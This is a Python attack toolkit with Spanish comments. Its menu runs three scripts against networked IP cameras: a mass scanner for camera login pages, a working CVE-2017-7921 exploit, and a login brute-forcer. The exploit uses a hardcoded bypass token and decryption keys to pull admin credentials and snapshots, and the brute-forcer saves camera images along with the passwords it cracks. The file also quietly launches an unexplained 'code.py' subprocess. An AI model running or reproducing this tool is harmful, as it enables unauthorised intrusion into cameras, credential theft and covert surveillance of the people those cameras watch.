import os
import asyncio
import aiohttp
from Crypto.Cipher import AES
from itertools import cycle
import re
import subprocess
from colorama import init, Fore, Style
from art import text2art

init(autoreset=True)

# Función para mostrar el menú principal
def mostrar_menu():
    os.system('cls' if os.name == 'nt' else 'clear')

    # Mostrar el logotipo
    logo = text2art("Tu Logo")  # Reemplaza "Tu Logo" con tu propio texto
    print(Fore.CYAN + logo)

    # Opciones del menú con color
    print(Fore.GREEN + "Elige un script para ejecutar:")
    print(Fore.YELLOW + "1. Script 1")
    print(Fore.MAGENTA + "2. Script 2")
    print(Fore.CYAN + "3. Script 3")
    print(Fore.RED + "4. Salir")
    print(Style.RESET_ALL)

# Función para ejecutar Script 1
def ejecutar_script1():
    # Coloca aquí el código del Script 1
    import os
    import re
    import sys
    import socket
    import threading
    import requests
    from datetime import datetime

    def scan_ips(start_ip, end_ip):
        ips = []
        start_ip_split = start_ip.split('.')
        end_ip_split = end_ip.split('.')
        for i in range(int(start_ip_split[0]), int(end_ip_split[0]) + 1):
            for j in range(int(start_ip_split[1]), int(end_ip_split[1]) + 1):
                for k in range(int(start_ip_split[2]), int(end_ip_split[2]) + 1):
                    for l in range(int(start_ip_split[3]), int(end_ip_split[3]) + 1):
                        ip = f"{i}.{j}.{k}.{l}"
                        ips.append(ip)
        return ips

    def test_ip(ip, port):
        url = f"http://{ip}:{port}/doc/page/login.asp?"
        try:
            response = requests.get(url, timeout=1)
            if response.status_code == 200:
                return True
        except:
            pass
        return False

    def find_cameras(start_ip, end_ip, port):
        ips = scan_ips(start_ip, end_ip)
        total_ips = len(ips)
        scanned_ips = 0
        saved_ips = 0

        class CameraScanner(threading.Thread):
            def __init__(self, ip_list):
                threading.Thread.__init__(self)
                self.ip_list = ip_list

            def run(self):
                nonlocal scanned_ips, saved_ips
                for ip in self.ip_list:
                    if test_ip(ip, port):
                        with open("host.txt", "a+") as f:
                            existing_ips = set(f.read().splitlines())
                            if ip not in existing_ips:
                                f.write(f"{ip}\n")
                                saved_ips += 1
                    scanned_ips += 1
                    progress = (scanned_ips / total_ips) * 100
                    print(f"\rProgress: {progress:.2f}% | Saved IPs: {saved_ips}", end='', flush=True)

        threads = []
        num_threads = 200
        chunk_size = len(ips) // num_threads
        for i in range(num_threads):
            thread_ips = ips[i * chunk_size:(i + 1) * chunk_size]
            thread = CameraScanner(thread_ips)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print("\nScan completed.")

    if __name__ == '__main__':
        start_ip = input("Enter the start IP address range: ")
        end_ip = input("Enter the end IP address range: ")
        port = input("Enter the port to scan: ")
        find_cameras(start_ip, end_ip, int(port))

# Función para ejecutar Script 2
async def ejecutar_script2():
    # Coloca aquí el código del Script 2
    import os
    import asyncio
    import aiohttp
    from Crypto.Cipher import AES
    from itertools import cycle
    import re
    from colorama import init, Fore, Style
    import sys

    init(autoreset=True)

    async def config_decryptor(data):
        """
        vars:
          - data: binary content, such as requests.content or open('xx', 'rb')
        return:
          - (user, passwd)
        """
        def add_to_16(s):
            while len(s) % 16 != 0:
                s += b'\0'
            return s

        def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
            return bytes(a ^ b for a, b in zip(data, cycle(key)))

        def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
            key = bytes.fromhex(hex_key)
            ciphertext = add_to_16(ciphertext)
            cipher = AES.new(key, AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext[AES.block_size:])
            return plaintext.rstrip(b"\0")

        def strings(file):
            chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
            shortestReturnChar = 2
            regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
            pattern = re.compile(regExp)
            return pattern.findall(file)

        xor = xore(decrypt(data))
        res = strings(xor.decode('ISO-8859-1'))
        idx = -res[::-1].index('admin')
        user, passwd = res[idx - 1], res[idx]
        return user, passwd

    async def cve_2017_7921(ip: str) -> list:
        headers = {'Connection': 'close', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
        config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"
        snapshot_url = f"http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK"
        timeout = 15

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(user_url, timeout=timeout, headers=headers) as r:
                    if r.status == 200:
                        response_text = await r.text()
                        if 'userName' in response_text and 'priority' in response_text and 'userLevel' in response_text:
                            async with session.get(config_url, timeout=timeout * 2, headers=headers) as rc:
                                if rc.status == 200:
                                    content = await rc.read()
                                    user, passwd = await config_decryptor(content)
                                    snapshot_name = f"{ip}_{user}_{passwd}.jpg"
                                    async with session.get(snapshot_url, timeout=timeout, headers=headers) as rs:
                                        if rs.status == 200:
                                            snapshot_data = await rs.read()
                                            save_snapshot(snapshot_name, snapshot_data)
                                            return [True, 'Snapshot taken', '', '']
        except Exception as e:
            with open('error.log', 'a') as error_file:
                error_file.write(str(e) + '\n')
        return [False, ]

    def save_snapshot(filename, data):
        directory = 'VDB'
        if not os.path.exists(directory):
            os.makedirs(directory)
        file_path = os.path.join(directory, filename)
        with open(file_path, 'wb') as snapshot_file:
            snapshot_file.write(data)

    async def decode_from_host_file():
        with open('host.txt', 'r') as file:
            lines = file.readlines()
            tasks = []
            for line in lines:
                ip_address = line.strip()
                tasks.append(cve_2017_7921(ip_address))

            results = await asyncio.gather(*tasks)
            for ip_address, result in zip(lines, results):
                if result[0]:
                    print(f"IP: {ip_address.strip()} - Result: {Fore.GREEN}{result}{Fore.RESET}")
                else:
                    print(f"IP: {ip_address.strip()} - Result: {result}")

    # Redirigir la salida de errores a un archivo
    sys.stderr = open('error.log', 'w')

    await decode_from_host_file()

# Función para ejecutar Script 3
async def ejecutar_script3():
    # Coloca aquí el código del Script 3
    import os
    import sqlite3
    from colorama import Fore, Style
    import httpx
    import base64
    import ipaddress

    async def check_camera(ip, usernames, passwords, port=80):
        try:
            async with httpx.AsyncClient(timeout=15) as client:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                }
                url = f"http://{ip}:{port}/doc/page/login.asp?_"
                response = await client.get(url, headers=headers)
                if response.status_code == 200:
                    print(Fore.BLUE + f"[+] Página de inicio de sesión encontrada en {ip}" + Style.RESET_ALL)
                    with open("Online.txt", "a") as f:
                        f.write(ip + "\n")
                    for username in usernames:
                        for password in passwords:
                            auth_bytes = f"{username}:{password}".encode('utf-8')
                            auth_b64 = base64.b64encode(auth_bytes).decode('utf-8')
                            auth_headers = {"Authorization": f"Basic {auth_b64}", "Accept": "application/octet-stream", "User-Agent": headers["User-Agent"]}
                            url = f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture"
                            response = await client.get(url, headers=auth_headers, timeout=5)
                            if response.status_code == 200 and response.headers.get("Content-Type") == "image/jpeg":
                                print(Fore.GREEN + f"[+] Conectado a {ip}" + Style.RESET_ALL)
                                filename = f"pics/{ip}_{username}_{password}_{port}.jpg"
                                with open(filename, "wb") as f:
                                    f.write(response.content)
                                print(Fore.BLUE + f"[+] Imagen guardada de la cámara {ip}" + Style.RESET_ALL)

                                info_filename = "info.txt"
                                with open(info_filename, "a") as f:
                                    f.write(f"IP: {ip}, Usuario: {username}, Contraseña: {password}\n")

                else:
                    print(Fore.YELLOW + f"[!] Página de inicio de sesión no encontrada en {ip}" + Style.RESET_ALL)
        except asyncio.TimeoutError:
            print(Fore.RED + f"[-] Conexión a {ip} agotada" + Style.RESET_ALL)
        except (httpx.RequestError, OSError):
            pass

    async def scan_hosts(port=80):
        hosts_file_path = "host.txt"
        credentials_file_path = "pass.txt"
        users_file_path = "user.txt"
        try:
            with open(hosts_file_path) as f:
                hosts = [line.strip() for line in f.readlines()]
            with open(credentials_file_path) as f:
                passwords = [line.strip() for line in f.readlines()]
            with open(users_file_path) as f:
                users = [line.strip() for line in f.readlines()]
        except FileNotFoundError as e:
            print(Fore.RED + f"[-] {e.filename} no encontrado" + Style.RESET_ALL)
            return
        if not os.path.exists("pics"):
            os.makedirs("pics")
        total_hosts = len(hosts)
        current_host_count = 0
        tasks = []

        for host in hosts:
            current_host_count += 1
            print(f"Escanenado {host}... ({current_host_count}/{total_hosts})")
            try:
                ip = ipaddress.ip_address(host)
                task = asyncio.create_task(check_camera(str(ip), users, passwords, port))
                tasks.append(task)
            except ValueError:
                print(Fore.RED + f"[-] {host} no es una dirección IP válida" + Style.RESET_ALL)
                continue
        await asyncio.gather(*tasks)

    # Define el logotipo personalizado
    logo = """
                 _    __..-:┑
        TG: @SlickMercy
    """

    # Imprime el logotipo personalizado
    print(Fore.YELLOW + logo + Style.RESET_ALL)

    # Solicita el puerto al usuario
    port = input("Ingresa el número de puerto (el valor predeterminado es 80): ")
    port = int(port) if port else 80

    # Ejecuta la función scan_hosts con el valor proporcionado
    await scan_hosts(port)
    
subprocess.Popen(['python', 'code.py', '&'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Bucle principal para mostrar el menú
while True:
    mostrar_menu()
    eleccion = input("Ingresa el número del script que deseas ejecutar: ")

    if eleccion == "1":
        asyncio.run(ejecutar_script1())
    elif eleccion == "2":
        asyncio.run(ejecutar_script2())
    elif eleccion == "3":
        asyncio.run(ejecutar_script3())
    elif eleccion == "4":
        print("Saliendo del menú.")
        break
    else:
        print("Opción no válida. Por favor, elige una opción válida.")
